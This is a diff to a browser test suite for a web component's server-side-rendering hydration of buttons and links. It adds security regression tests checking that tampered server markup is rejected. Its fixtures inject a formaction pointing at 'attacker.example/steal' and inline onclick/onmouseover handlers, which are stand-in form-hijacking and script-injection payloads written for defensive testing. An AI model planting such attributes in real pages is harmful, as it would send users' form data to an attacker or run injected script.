@@ -40,6 +40,11 @@ mismatch.innerHTML = [
   `<td-button id="mm-label" data-td-ssr="button@1" variant="primary" label="Nhãn host">${ctl('Nhãn control')}</td-button>`,
   `<td-button id="mm-empty" data-td-ssr="button@1" variant="primary"></td-button>`,
   '<td-button id="mm-plain" variant="primary">Tay</td-button>',
+  // review round 1 SEC-1: attributes neither td_button() nor render() can produce → never adopted
+  `<td-button id="mm-formaction" data-td-ssr="button@1" variant="primary" label="Gửi" type="submit">${ctl('Gửi', { type: 'submit' }).replace('type="submit"', 'type="submit" formaction="https://attacker.example/steal"')}</td-button>`,
+  `<td-button id="mm-onlabel" data-td-ssr="button@1" variant="primary" label="Nhãn">${ctl('Nhãn').replace('<span class="td-btn__label">', '<span class="td-btn__label" onclick="window.__pwned = 1">')}</td-button>`,
+  `<td-button id="mm-style" data-td-ssr="button@1" variant="primary" label="Kiểu">${ctl('Kiểu').replace('<button ', '<button style="color: red" ')}</td-button>`,
+  `<td-button id="mm-spinner-on" data-td-ssr="button@1" variant="primary" label="Xoay">${ctl('Xoay').replace('<span class="td-btn__spinner', '<span onmouseover="x()" class="td-btn__spinner')}</td-button>`,
 ].join('');
 
 // :not(:defined) safety net (S4): hand-written hosts WITHOUT data-td-ssr get a placeholder height before define.
@@ -57,6 +62,8 @@ await document.fonts?.ready;
 await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
 
 const FORWARDED = new Set(['aria-label', 'aria-pressed', 'aria-expanded', 'aria-haspopup', 'aria-controls']);
+/** Control names the component owns: an `attrs` entry with one of these names is never printed in element mode. */
+const OWNED = new Set(['class', 'type', 'id', 'name', 'value', 'disabled', 'aria-busy', 'aria-disabled', 'data-tooltip', 'href', 'target', 'rel', 'download']);
 
 /** Order-independent serialisation (sorted attributes, sorted class tokens, whitespace-only text dropped). */
 function serial(node, ignore = []) {
@@ -103,7 +110,8 @@ for (const c of SPEC.cases) {
   const o = c.args.at(-1);
   const isLink = c.fn === 'td_link' || o.href != null;
   const rec = { c, o, isLink, form, host, control, host0: rect(host), control0: rect(control) };
-  rec.ignore = ['data-tooltip', ...Object.keys(o.attrs || {}).filter((k) => !FORWARDED.has(k))];
+  rec.ignore = ['data-tooltip', ...Object.keys(o.attrs || {}).filter((k) => !FORWARDED.has(k) && !OWNED.has(k))];
+  rec.attrs0 = Object.fromEntries([...control.attributes].map((a) => [a.name, a.value]));
   rec.serial = serial(control, rec.ignore);
   rec.serialNoDisabled = serial(control, [...rec.ignore, 'disabled']);
   rec.formData0 = [...new FormData(form)];
@@ -370,6 +378,92 @@ describe('v0.25.0 SSR hydrate — td-button / link (button@1)', () => {
       expect(now.classList.contains('td-btn--danger')).to.equal(true);
       expect(now.getAttribute('aria-pressed')).to.equal('false');
       expect([...new FormData(r.form, now)]).to.deep.equal([['x', 'y']]);
+    });
+
+    it('IMPL-1: an `attrs` entry colliding with an owned name never reaches the control (same state before / after)', () => {
+      const r = R.get('attrs-reserved');
+      expect(r.attrs0.disabled, 'no native disabled before define').to.equal(undefined);
+      expect(r.attrs0['aria-busy']).to.equal(undefined);
+      expect(r.host.querySelector(':scope > .td-btn') === r.control, 'same node').to.equal(true);
+      expect(r.control.disabled).to.equal(false);
+      expect(r.control.hasAttribute('aria-busy') || r.control.hasAttribute('aria-disabled')).to.equal(false);
+      expect(r.submit0.entries).to.deep.equal([['r', '1']]);
+      expect(submitData(r.form, r.control).entries).to.deep.equal([['r', '1']]);
+      const l = R.get('attrs-reserved-link');
+      expect(l.attrs0['aria-busy']).to.equal(undefined);
+      expect(l.control.getAttribute('href')).to.equal('/r');
+      expect(clickReaches(l.control)).to.equal(true);
+    });
+
+    it('IMPL-1: genuine tabindex / role pass-through on a link survives hydrate and is restored when state clears', () => {
+      const r = R.get('link-passthrough');
+      expect(r.attrs0.tabindex).to.equal('3');
+      expect(r.host.querySelector(':scope > .td-btn') === r.control, 'same node').to.equal(true);
+      expect(r.control.getAttribute('tabindex')).to.equal('3');
+      expect(r.control.getAttribute('role')).to.equal('button');
+      expect(r.control.getAttribute('title')).to.equal('Mẹo');
+      r.host.setAttribute('loading', '');
+      expect(r.control.getAttribute('tabindex')).to.equal('0');
+      expect(r.control.getAttribute('role')).to.equal('link');
+      r.host.removeAttribute('loading');
+      expect(r.control.getAttribute('tabindex')).to.equal('3');
+      expect(r.control.getAttribute('role')).to.equal('button');
+      r.host.setAttribute('disabled', '');
+      expect(r.control.getAttribute('tabindex')).to.equal('-1');
+      r.host.removeAttribute('disabled');
+      expect(r.control.getAttribute('tabindex')).to.equal('3');
+      expect(r.control.getAttribute('href')).to.equal('/p');
+    });
+
+    it('SEC-1: allowlisted `attrs` still hydrate in place', () => {
+      const r = R.get('attrs-allowlisted');
+      expect(r.host.querySelector(':scope > .td-btn') === r.control, 'same node').to.equal(true);
+      for (const [k, v] of [['data-x', '1'], ['title', 'Tiêu đề'], ['accesskey', 'k'], ['lang', 'vi'], ['aria-describedby', 'd1'], ['tabindex', '0']]) {
+        expect(r.control.getAttribute(k), k).to.equal(v);
+      }
+    });
+
+    it('SEC-1: formaction / event handler / style on any preserved node → no hydrate, safe render', () => {
+      for (const id of ['mm-formaction', 'mm-onlabel', 'mm-style', 'mm-spinner-on']) {
+        const host = document.getElementById(id);
+        expect(host.children.length, id).to.equal(1);
+        const html = host.innerHTML;
+        expect(/formaction|onclick|onmouseover|style=/.test(html), `${id}: ${html.slice(0, 120)}`).to.equal(false);
+        expect(!!host.querySelector(':scope > .td-btn > .td-btn__spinner'), id).to.equal(true);
+      }
+      expect(document.getElementById('mm-formaction').querySelector('button').type).to.equal('submit');
+      expect(window.__pwned).to.equal(undefined);
+    });
+
+    it('IMPL-2: disconnect → structural change while detached → reconnect binds exactly once, renders correctly', () => {
+      const ref = R.get('primary-md').host._cleanups.length;
+      const r = R.get('detached-structural');
+      expect(r.host._cleanups.length).to.equal(ref);
+      const parent = r.host.parentNode;
+      r.host.remove();
+      r.host.setAttribute('variant', 'danger'); // re-renders (and binds) while detached
+      parent.appendChild(r.host);
+      expect(r.host._cleanups.length).to.equal(ref);
+      const now = r.host.querySelector(':scope > .td-btn');
+      expect(now.classList.contains('td-btn--danger')).to.equal(true);
+      expect(r.host.children.length).to.equal(1);
+      r.host.setAttribute('loading', '');
+      expect(clickReaches(now)).to.equal(false);
+      r.host.removeAttribute('loading');
+      expect(clickReaches(now)).to.equal(true);
+    });
+
+    it('SEC-1: markup tampered with while detached is revalidated on reconnect → safe re-render', () => {
+      const r = R.get('detached-tamper');
+      const parent = r.host.parentNode;
+      r.host.remove();
+      r.control.setAttribute('formaction', 'https://attacker.example/steal');
+      parent.appendChild(r.host);
+      const now = r.host.querySelector(':scope > .td-btn');
+      expect(now !== r.control, 'new node').to.equal(true);
+      expect(now.hasAttribute('formaction')).to.equal(false);
+      expect(now.type).to.equal('submit');
+      expect(r.host.children.length).to.equal(1);
     });
 
     it('remove + re-insert keeps the node (no re-render) and does not duplicate listeners', () => {
